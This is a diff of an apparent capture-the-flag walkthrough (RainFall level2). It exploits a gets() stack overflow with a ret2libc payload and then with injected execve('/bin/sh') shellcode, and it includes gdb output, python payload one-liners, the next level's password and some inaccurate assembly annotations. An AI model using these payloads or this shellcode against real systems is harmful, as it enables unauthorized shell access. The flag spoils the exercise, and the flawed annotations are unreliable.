@@ -1,110 +1,65 @@
-1. See files and try to use:
-	level2@RainFall:~$ ./level2
-	a
-	a
-Take input and write it.
-2. Analyze with gdb:
-(gdb) disas main
-Dump of assembler code for function main:
-   0x0804853f <+0>:	push   %ebp
-   0x08048540 <+1>:	mov    %esp,%ebp
-   0x08048542 <+3>:	and    $0xfffffff0,%esp
-   0x08048545 <+6>:	call   0x80484d4 <p>
-   0x0804854a <+11>:	leave
-   0x0804854b <+12>:	ret
-We have function p, analyze it
-(gdb) disas p
-Dump of assembler code for function p:
-   0x080484d4 <+0>:	push   %ebp
-   0x080484d5 <+1>:	mov    %esp,%ebp
-   0x080484d7 <+3>:	sub    $0x68,%esp
-   0x080484da <+6>:	mov    0x8049860,%eax
-   0x080484df <+11>:	mov    %eax,(%esp)
-   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
-   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
-   0x080484ea <+22>:	mov    %eax,(%esp)
-   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
-   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
-   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
-   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
-   0x080484fb <+39>:	and    $0xb0000000,%eax
-   0x08048500 <+44>:	cmp    $0xb0000000,%eax
-   0x08048505 <+49>:	jne    0x8048527 <p+83>
-   0x08048507 <+51>:	mov    $0x8048620,%eax
-   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
-   0x0804850f <+59>:	mov    %edx,0x4(%esp)
-   0x08048513 <+63>:	mov    %eax,(%esp)
-   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
-   0x0804851b <+71>:	movl   $0x1,(%esp)
-   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
-   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
-We have gets function, it have vulnerability.
-Gets vulnerability is mean that we could to overfull local variable array and put this array to gets.
-After it gets let us to control stack and we could to perform our own command via call them with address of programs.
-https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351
+We see that have 2 general offesets
+1. gets <- which we could to overfill
+2. strdup <- whoes have offset of malloc
 
-Try to find EIP offset:
-(gdb) r
-Starting program: /home/user/level2/level2
-l;sakdhflkjshgkljfdskjhd;lshdflsjdhgkljdfhkgjdhsfkljhgsfkjhdklsjghdslkjghdkljhgkldjhfglkdjshgkldjshgkljdhfkgljhdskgjhfdslgjhdslkfgjhdskljhfgkldsjhfgldjshfglkjdshfglsdkjhfglkdjhfgkldjhs
-l;sakdhflkjshgkljfdskjhd;lshdflsjdhgkljdfhkgjdhsfkljhgsfkjhdklsjldjhlkjghdkljhgkldjhfglkdjshgkldjshgkljdhfkgljhdskgjhfdslgjhdslkfgjhdskljhfgkldsjhfgldjshfglkjdshfglsdkjhfglkdjhfgkldjhs
+Therefore we could to overfill gets with ouwn
+comman "execve/bin/sh" where:
+execve - performing system commands
+/bin/sh - launching shell
 
-Program received signal SIGSEGV, Segmentation fault.
-0x686a646c in ?? ()
+Address of execve/bin/sh:
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+http://shell-storm.org/shellcode/files/shellcode-575.php
+to array s[76] + fill with trash 59 symbols yet ("a" * 59)
 
-Maybe is it 80 like at previous step?
-Why 80? Because 76 cells of array will be fill with trash and + 4 bytes than instead ret to call function
-system. Function system is open for us access to perform our command.
-	python -c 'print "A" * 80 + "BBBB"' > /tmp/test2
+After it we are searching address where returning value of
+malloc. Strdup using malloc and we find it with disas
+> disas p - than to see instructions
+We are see that 0x08048538 calling function
+   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
+   0x0804853d <+105>:   leave  
+And cheking next instruction 0x0804853d to check the value
+and address of malloc where this value placed.
+We set breakpoint:
+> b *0x0804853d
+and run programm
+> r
+> A
+> A
+Breakpoint 3, 0x0804853d in p ()
+And see value of $eax
+(gdb) x $eax
+x - use the x command to display the contents of the memory
+And we see
+0x804a008:      0x00000065
+where 0x00000065 is value
+0x804a008 is address of malloc
+We write this place of malloc like address
+0x0804a008
+And we use it than to start instead malloc perform
+our own shellcode.
 
-At first we should to find address of ret and system programms address than to pass them to input.
-gdb> info function ret <- than to find address of ret
-gdb> info function system <- than to find address of system.
+python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 59+ "\x08\xa0\x04\x08"' > /tmp/breaker
 
+cat /tmp/breaker - | ./level2 
 
-   0x08048538 <+100>:   call   0x80483e0 <strdup@plt> <-- 1. overflow strdup + 4 bytes to go to ret func
-   0x0804853d <+105>:   leave                         <-- 2. miss this step
-   0x0804853e <+106>:   ret                           <-- 3. write ret address
-   than to launch ret function.
+Shellcode:
 
- After it finding with own main.c address of function system of libc 0xb7e6b060 
+char sc[] = "\x6a\x0b" // push byte +0xb
+"\x58" // pop eax <-- cleaning value of eax
+"\x99" // cdq <-- Convert double to quadruple
+https://indigobits.com/assembler/12-komandy-rasshireniya.html
+"\x52" // push edx <-- send to stack
+"\x68\x2f\x2f\x73\x68" // push dword 0x68732f2f <-- push address of bin
+"\x68\x2f\x62\x69\x6e" // push dword 0x6e69922f <-- push address of sh
+"\x89\xe3" // mov ebx, esp 
+esp is register of pointer of stack
+ebx is base of memory which temporary keep what did upper
+and move it to esp (to stack)
+"\x31\xc9" // xor ecx, ecx
+ecx is counter of operations (usually in order)
+http://natalia.appmat.ru/c&c++/assembler.html
 
-int     main(int argc, char **argv)
-{
-        system();
-        printf("%s is at %p\n", argv[1], getenv(argv[1]));
-        return (0);
-}
-
-"\x3e\x85\x04\x08" - is return func
-"\x60\xb0\xe6\xb7" - is addr of system func which start machine with root rights.
-"b" * 4 
-"\x3c\x9f\xff\xbf"
-python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "DUMM" + "\x3c\x9f\xff\xbf"' > /tmp/breaker2
-
-0x08048360 - system
-cat /tmp/breaker2 - | ./level2
-
-cat /home/user/level3/.pass
-492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
-0x8048330
-
-! Узнать адрес ret, system и собственного шеллкода, который закинули в env, а затем заполнить стэк? заменить рет на систем команду, затем заполнить еще 4 байта и вызывать шелл код
-
-
-
-At first we decide to overflow array with letters more than 76 than to find place where programm call SIGSEGV
-Launch programm with gdb
-- (gdb) r < <(echo 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ')
-put this string with other letters.
-And we are seeing sigsev in address
-- Program received signal SIGSEGV, Segmentation fault.
-- 0x55555555 in ?? ()
-And when we print this 0x55555555, we see that sigsev was in letter 'U'
-- (gdb) p (char)0x55555555
-- $6 = 85 'U'
-Therefore we found that programms offset 76 cells + 4 bites for address.
-Next step is to find address of system and libc
-0xb7e6b060 - system
-0xb7e2c000 - libc
-0xb7f8cc58 - "bin/sh"
+"\xcd\x80"; // int 0x80
+is system call of kernel than to say to perform
+what is writed in up.
